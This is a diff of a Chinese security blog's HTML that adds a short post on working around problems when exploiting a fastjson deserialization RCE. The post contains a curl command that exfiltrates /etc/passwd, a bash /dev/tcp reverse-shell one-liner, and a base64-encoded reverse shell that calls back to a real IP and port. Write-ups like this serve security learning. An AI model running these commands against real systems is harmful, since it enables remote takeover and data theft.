@@ -6,14 +6,18 @@
   <meta name="renderer" content="webkit">
   <meta http-equiv="X-UA-Compatible" content="IE=edge" >
   <link rel="dns-prefetch" href="http://yoursite.com">
-  <title>Archives | Halfblue</title>
+  <title>fastjson rce利用踩坑 | Halfblue</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="Halfblue">
-<meta property="og:url" content="http://yoursite.com/archives/index.html">
+  <meta name="description" content="用burp插件扫到个fastjson，找了个工具测试curl，很快收到了请求，感觉很简单想执行别的命令看看，结果一个周末就搭上面了">
+<meta property="og:type" content="article">
+<meta property="og:title" content="fastjson rce利用踩坑">
+<meta property="og:url" content="http://yoursite.com/2020/05/25/fastjson-rce利用踩坑/index.html">
 <meta property="og:site_name" content="Halfblue">
+<meta property="og:description" content="用burp插件扫到个fastjson，找了个工具测试curl，很快收到了请求，感觉很简单想执行别的命令看看，结果一个周末就搭上面了">
+<meta property="og:updated_time" content="2020-05-25T09:09:56.290Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="Halfblue">
+<meta name="twitter:title" content="fastjson rce利用踩坑">
+<meta name="twitter:description" content="用burp插件扫到个fastjson，找了个工具测试curl，很快收到了请求，感觉很简单想执行别的命令看看，结果一个周末就搭上面了">
   
     <link rel="alternative" href="/atom.xml" title="Halfblue" type="application/atom+xml">
   
@@ -143,373 +147,129 @@
             <canvas data-colors="#eaeaea" data-sectionHeight="100" data-contentId="js-content" id="myCanvas1" class="anm-canvas"></canvas>
           </div>
           <div id="js-content" class="content-ll">
-            
-  
-  
+            <article id="post-fastjson-rce利用踩坑" class="article article-type-post " itemscope itemprop="blogPost">
+  <div class="article-inner">
     
-    
-      
-      
-      <section class="archives-wrap">
-        <div class="archive-year-wrap">
-          <a href="/archives/2020" class="archive-year">2020</a>
-        </div>
-        <div class="archives">
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/26/xxe从入门到入门/" class="archive-article-date">
-  	<time datetime="2020-05-26T13:09:43.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-26</time>
-</a>
-        </div>
-    	 
+      <header class="article-header">
+        
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/26/xxe从入门到入门/">xxe从入门到入门</a>
+    <h1 class="article-title" itemprop="name">
+      fastjson rce利用踩坑
     </h1>
   
 
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/05/25/fastjson-rce利用踩坑/" class="archive-article-date">
+        
+        <a href="/2020/05/25/fastjson-rce利用踩坑/" class="archive-article-date">
   	<time datetime="2020-05-25T02:21:58.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-05-25</time>
 </a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/05/25/fastjson-rce利用踩坑/">fastjson rce利用踩坑</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
+        
+      </header>
     
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/24/java反序列化回显自闭之旅/" class="archive-article-date">
-  	<time datetime="2020-04-24T08:50:08.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-24</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/24/java反序列化回显自闭之旅/">java反序列化回显自闭之旅</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color2">java安全</a>
-        </li>
+    <div class="article-entry" itemprop="articleBody">
       
-		</ul>
-	</div>
+        <p>用burp插件扫到个fastjson，找了个工具测试curl，很快收到了请求，感觉很简单想执行别的命令看看，结果一个周末就搭上面了<a id="more"></a><br>用的工具是群里少宇推荐的fastjson_rce_tool，很好用，唯一的问题是只能执行一条命令，不能定制java脚本。嫌麻烦我懒得自己启jndi服务什么的，就想用这个工具直接弹shell。结果试了各种弹shell的方法都失败了，很迷惑。<br>然后考虑curl带外，这里一个很坑的地方是如果直接在参数写”curl ip/<code>whoami</code>“这种的话，反引号的内容实际上是在本机解析的，也就是查看的是自己的whoami，当时用ifconfig看到自己的ip时候才明白过来。那就只能用curl读读文件curl -F file=@/etc/passwd ip这样。<br>要执行命令就要用到管道，本来想base64的，但是好像目标没有base64。最后的解决办法是’echo “curl ip/<code>pwd</code>“ | /bin/bash’终于成功执行了命令。但很奇怪的是直接curl的时候源ip和用bash执行时候的源ip不一样，后一台还会隔几分钟，不太清楚负载什么怎么做的。<br>看了下pwd是/root/bash_sandbox_samples/随机字符，这样的一个目录，那应该是一个删减的shell，功能比较少。还是不知道怎么处理多行返回值。<br>最后在CaijiOrz的工具找到了一个神奇的命令<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">/bin/bash -c <span class="variable">$@</span>|bash 0 <span class="built_in">echo</span> bash -i &gt;&amp;/dev/tcp/ip/port 0&gt;&amp;1</div></pre></td></tr></table></figure></p>
+<p>弹出来了，给力<br>看来是java的执行shell方式有些独特。。。看了下服务器上base64之类的命令都有，不懂为什么失败。<br>还找到个以前记录过的，也可以<br><figure class="highlight bash"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">bash -c &#123;<span class="built_in">echo</span>,YmFzaCAtaSA+JiAvZGV2L3RjcC8xNzIuMjQ3Ljc2LjUxLzg4ODggMD4mMQ==&#125;|&#123;base64,<span class="_">-d</span>&#125;|&#123;bash,-i&#125;</div></pre></td></tr></table></figure></p>
+<p>感觉自己好像瞎，明明之前有个ctf的反序列化题里看wp复制下来的。。。看来别人帮踩了坑也没有用，自己还是会掉里面。<br>原理在<a href="https://b1ngz.github.io/java-os-command-injection-note/" target="_blank" rel="external">https://b1ngz.github.io/java-os-command-injection-note/</a></p>
+<p>参考链接<br><a href="https://github.com/wyzxxz/fastjson_rce_tool" target="_blank" rel="external">https://github.com/wyzxxz/fastjson_rce_tool</a><br><a href="https://github.com/CaijiOrz/fastjson-1.2.47-RCE" target="_blank" rel="external">https://github.com/CaijiOrz/fastjson-1.2.47-RCE</a></p>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/04/02/php反序列化的千层套路/" class="archive-article-date">
-  	<time datetime="2020-04-02T13:32:50.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-04-02</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/04/02/php反序列化的千层套路/">php反序列化的千层套路</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color4">CTF</a>
-        </li>
       
-		</ul>
-	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/28/java反序列化连续剧三/" class="archive-article-date">
-  	<time datetime="2020-03-28T07:59:17.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-28</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/28/java反序列化连续剧三/">java反序列化连续剧三</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color2">java安全</a>
-        </li>
       
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/23/java反序列化连续剧二/" class="archive-article-date">
-  	<time datetime="2020-03-23T07:57:16.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-23</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/23/java反序列化连续剧二/">java反序列化连续剧二</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color2">java安全</a>
-        </li>
+    </div>
+    <div class="article-info article-info-index">
       
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/21/java反序列化连续剧一/" class="archive-article-date">
-  	<time datetime="2020-03-21T15:26:26.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-21</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/21/java反序列化连续剧一/">java反序列化连续剧一</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color2">java安全</a>
-        </li>
       
-		</ul>
-	</div>
-
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/16/最好的语言之javascript原型链污染/" class="archive-article-date">
-  	<time datetime="2020-03-16T14:46:44.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-16</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/16/最好的语言之javascript原型链污染/">最好的语言之javascript原型链污染</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color4">CTF</a>
-        </li>
       
-		</ul>
-	</div>
 
-          
-
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/03/09/python安全之pickle反序列化/" class="archive-article-date">
-  	<time datetime="2020-03-09T09:48:46.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-03-09</time>
-</a>
-        </div>
-    	 
-  
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/03/09/python安全之pickle反序列化/">python安全之pickle反序列化</a>
-    </h1>
-  
-
-        <div class="article-info info-on-right">
-          
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags"></i>
-		<ul class="article-tag-list">
-			 
-        <li class="article-tag-list-item">
-        	<a href="javascript:void(0)" class="article-tag-list-link color4">CTF</a>
-        </li>
       
-		</ul>
-	</div>
 
-          
-
+      
+        
+<div class="share-btn share-icons tooltip-left">
+  <div class="tooltip tooltip-east">
+    <span class="tooltip-item">
+      <a href="javascript:;" class="share-sns share-outer">
+        <i class="icon icon-share"></i>
+      </a>
+    </span>
+    <span class="tooltip-content">
+      <div class="share-wrap">
+        <div class="share-icons">
+          <a class="weibo share-sns" href="javascript:;" data-type="weibo">
+            <i class="icon icon-weibo"></i>
+          </a>
+          <a class="weixin share-sns wxFab" href="javascript:;" data-type="weixin">
+            <i class="icon icon-weixin"></i>
+          </a>
+          <a class="qq share-sns" href="javascript:;" data-type="qq">
+            <i class="icon icon-qq"></i>
+          </a>
+          <a class="douban share-sns" href="javascript:;" data-type="douban">
+            <i class="icon icon-douban"></i>
+          </a>
+          <a class="qzone share-sns" href="javascript:;" data-type="qzone">
+            <i class="icon icon-qzone"></i>
+          </a>
+          <a class="facebook share-sns" href="javascript:;" data-type="facebook">
+            <i class="icon icon-facebook"></i>
+          </a>
+          <a class="twitter share-sns" href="javascript:;" data-type="twitter">
+            <i class="icon icon-twitter"></i>
+          </a>
+          <a class="google share-sns" href="javascript:;" data-type="google">
+            <i class="icon icon-google"></i>
+          </a>
         </div>
-        <div class="clearfix"></div>
-    </header>
+      </div>
+    </span>
+  </div>
+</div>
+
+<div class="page-modal wx-share js-wx-box">
+    <a class="close js-modal-close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <div class="wx-qrcode">
+      <img src="http://s.jiathis.com/qrcode.php?url=http://yoursite.com/2020/05/25/fastjson-rce利用踩坑/" alt="微信分享二维码">
+    </div>
+</div>
+
+<div class="mask js-mask"></div>
+      
+      <div class="clearfix"></div>
+    </div>
   </div>
 </article>
+
   
-    
-    
-    <article class="archive-article archive-type-post">
-  <div class="archive-article-inner">
-    <header class="archive-article-header">
-      	<div class="article-meta">
-	      	<a href="/2020/01/09/hackthebox环境配置及入门关卡writeup/" class="archive-article-date">
-  	<time datetime="2020-01-09T15:01:00.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2020-01-09</time>
-</a>
-        </div>
-    	 
+<nav id="article-nav">
   
-    <h1 itemprop="name">
-      <a class="archive-article-title" href="/2020/01/09/hackthebox环境配置及入门关卡writeup/">hackthebox环境配置及入门关卡writeup</a>
-    </h1>
+    <a href="/2020/05/26/xxe从入门到入门/" id="article-nav-newer" class="article-nav-link-wrap">
+      <i class="icon-circle-left"></i>
+      <div class="article-nav-title">
+        
+          xxe从入门到入门
+        
+      </div>
+    </a>
+  
+  
+    <a href="/2020/04/24/java反序列化回显自闭之旅/" id="article-nav-older" class="article-nav-link-wrap">
+      <div class="article-nav-title">java反序列化回显自闭之旅</div>
+      <i class="icon-circle-right"></i>
+    </a>
+  
+</nav>
+
+
+
+
+
+
+  
+    <div class="duoshuo"></div>
   
 
-        <div class="article-info info-on-right">
-          
-          
 
-        </div>
-        <div class="clearfix"></div>
-    </header>
-  </div>
-</article>
-  
-  
-    </div></section>
-  
-
-    
-    <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><a class="extend next" rel="next" href="/archives/page/2/">Next &raquo;</a>
-    </nav>
-  
 
 
           </div>
@@ -532,8 +292,8 @@
 	var yiliaConfig = {
 		mathjax: false,
 		isHome: false,
-		isPost: false,
-		isArchive: true,
+		isPost: true,
+		isArchive: false,
 		isTag: false,
 		isCategory: false,
 		open_in_new: false,
